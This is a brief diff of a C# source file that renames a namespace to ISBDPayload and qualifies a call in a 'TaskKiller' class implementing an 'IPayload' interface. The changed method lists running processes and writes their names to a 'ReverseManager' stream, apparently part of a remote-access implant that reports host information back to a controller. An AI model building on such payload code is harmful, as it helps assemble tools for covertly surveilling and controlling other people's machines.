@@ -6,7 +6,7 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 
-namespace ISBD
+namespace ISBDPayload
 {
     class TaskKiller : IPayload
     {
@@ -29,7 +29,7 @@ namespace ISBD
         {
             foreach (Process process in Process.GetProcesses())
             {
-                ReverseManager.WriteStream(process.ProcessName);
+                ISBD.ReverseManager.WriteStream(process.ProcessName);
             }
             IsEnabled = false;
         }
